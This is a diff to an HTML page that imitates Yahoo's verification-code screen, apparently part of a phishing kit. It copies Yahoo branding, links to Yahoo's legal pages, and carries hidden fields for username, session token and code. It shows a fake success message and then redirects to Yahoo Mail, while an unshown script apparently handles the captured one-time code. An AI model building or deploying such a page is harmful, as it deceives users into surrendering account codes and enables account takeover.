@@ -1,61 +1,95 @@
 <!DOCTYPE html>
-<html data-wf-page="yahoo-otp" data-wf-site="yahoo">
+<html data-wf-page="67c6f50ed426ad7d5847f218" data-wf-site="67c6f50ed426ad7d5847f211">
 <head>
   <meta charset="utf-8">
-  <title>Enter Verification Code - Yahoo</title>
-  <meta content="Enter your Yahoo verification code" name="description">
-  <meta content="Enter Verification Code - Yahoo" property="og:title">
-  <meta content="Enter your Yahoo verification code" property="og:description">
+  <title>Yahoo - Enter Verification Code</title>
   <meta content="width=device-width, initial-scale=1" name="viewport">
-<link href="css/normalize.css" rel="stylesheet" type="text/css">
+  <meta content="Webflow" name="generator">
+  <link href="css/normalize.css" rel="stylesheet" type="text/css">
   <link href="css/webflow.css" rel="stylesheet" type="text/css">
   <link href="css/yahoo-8d0526.webflow.css" rel="stylesheet" type="text/css">
-  <link href="webflow-yahoo.css" rel="stylesheet" type="text/css">
+  <!-- ONLY NEW COMPONENTS CSS -->
+  <link href="custom-components.css" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com" rel="preconnect">
+  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
   <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
-  <script type="text/javascript">WebFont.load({  google: {    families: ["Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]  }});</script>
+  <script type="text/javascript">WebFont.load({google:{families:["Montserrat:100,100italic,200,200italic,300,300italic,400,400italic,500,500italic,600,600italic,700,700italic,800,800italic,900,900italic","Open Sans:300,300italic,400,400italic,600,600italic,700,700italic,800,800italic"]}});</script>
   <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
-  <link href="https://uploads-ssl.webflow.com/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
-  <link href="https://uploads-ssl.webflow.com/img/webclip.png" rel="apple-touch-icon">
+  <link href="./yahoo.png" rel="shortcut icon" type="image/x-icon">
+  <link href="./yahoo.png" rel="apple-touch-icon">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
 </head>
 <body>
-  <div class="yahoo-container">
-    <div class="yahoo-logo">
-      <h1>yahoo!</h1>
+  <section class="section">
+    <div class="div-block">
+      <div class="div-block-2"><img src="images/yahoo.png" loading="lazy" alt="" class="image"></div>
+      <div class="div-block-3">
+        <div class="text-block">Help</div>
+        <div><a href="https://legal.yahoo.com/in/en/yahoo/terms/otos/index.html" class="link">Terms</a></div>
+        <div><a href="https://legal.yahoo.com/in/en/yahoo/privacy/index.html" class="link-2">Privacy</a></div>
+      </div>
     </div>
-    
-    <div class="text-center" style="margin-bottom: 30px;">
-      <h2 style="font-size: 24px; margin: 0 0 10px 0; color: #333;">Enter verification code</h2>
-      <p style="color: #666; margin: 0;">We sent a code to your email address</p>
+    <div class="layout active">
+      <div class="div-block-5">
+        <h3 class="header active">Enter verification code</h3>
+        <p class="parag active">We sent a verification code to help keep your account secure.</p>
+      </div>
+      <div class="form-block w-form">
+        <form id="otp-form" name="otp-form" data-name="OTP Form" class="form">
+          <input type="hidden" name="username" id="username">
+          <input type="hidden" name="crumb" id="crumb">
+          <input type="hidden" name="acrumb" id="acrumb">
+          <input type="hidden" name="sessionIndex" id="sessionIndex" value="1">
+          <input type="hidden" name="sessionToken" id="sessionToken">
+          <input type="hidden" name="done" value="https://mail.yahoo.com/d/folders/1">
+          <input type="hidden" name="src" value="ym">
+          <input type="hidden" name="verifyCode" id="verifyCode">
+          
+          <img src="images/yahoo.png" loading="lazy" alt="" class="image-2">
+          
+          <div class="pazzi" id="main-form">
+            <div class="reflectto" id="userEmail">Enter verification code</div>
+            <h1 class="heading-2"><strong>Enter verification code</strong></h1>
+            <div class="text-block-2">We sent a code to your email/phone<br></div>
+            <div class="pazz lpl">Verification Code<br></div>
+            <div class="ms-input-wrap otp-input-container">
+              <input class="ms-input w-input" maxlength="8"
+                     name="otp_code" data-name="otp_code" placeholder="Enter code" type="text"
+                     id="otp_code" required="" autofocus
+                     autocomplete="one-time-code">
+            </div>
+            <input type="submit" data-wait="Verifying..." class="logger w-button" value="Verify" id="submit-btn">
+            
+            <div style="margin-top: 15px; text-align: center;">
+              <a href="#" id="resend-code" class="resend-link">Didn't receive a code? Resend</a>
+            </div>
+          </div>
+          
+          <div class="errry" id="error-container" style="display: none;">
+            <h1 class="heading-2"><strong>Invalid code</strong></h1>
+            <div class="text-block-7" id="error-message">The code you entered is incorrect. Please try again.</div>
+            <button id="refreshButton" type="button" class="restart logger w-button error-retry-button">Try again</button>
+          </div>
+          
+          <div id="loading-state" style="display: none; text-align: center; padding: 20px;">
+            <div class="loading-spinner"></div>
+            <p>Verifying code...</p>
+          </div>
+          
+          <div id="success-state" style="display: none; text-align: center; padding: 20px;">
+            <div class="success-checkmark">✓</div>
+            <h2 style="color: #28a745; margin-bottom: 10px;">Verification successful!</h2>
+            <p>Redirecting to your account...</p>
+          </div>
+        </form>
+      </div>
     </div>
-
-    <div id="error-message" class="error-message"></div>
-    <div id="success-message" class="success-message"></div>
-
-    <form id="otp-form" class="yahoo-form" method="POST">
-      <input 
-        type="text" 
-        id="verifyCode" 
-        name="verifyCode" 
-        class="yahoo-input" 
-        placeholder="Enter 6-digit code" 
-        required 
-        maxlength="6"
-        pattern="[0-9]{6}"
-        autocomplete="one-time-code"
-        style="text-align: center; font-size: 24px; letter-spacing: 5px;"
-      >
-      
-      <button type="submit" id="submit-btn" class="yahoo-button">
-        Verify
-      </button>
-    </form>
-
-    <div class="text-center" style="margin-top: 20px;">
-      <p style="color: #666; font-size: 14px; margin-bottom: 10px;">Didn't receive the code?</p>
-      <a href="#" id="resend-link" class="yahoo-link">Resend code</a>
-    </div>
-  </div>
-
-  <script src="yahoo-otp.js"></script>
+  </section>
+  
+  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=67c6f50ed426ad7d5847f211" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+  <script src="js/webflow.js" type="text/javascript"></script>
+  
+  <!-- Custom OTP Page JavaScript -->
+  <script src="js/yahoo-otp.js" type="text/javascript"></script>
 </body>
 </html>
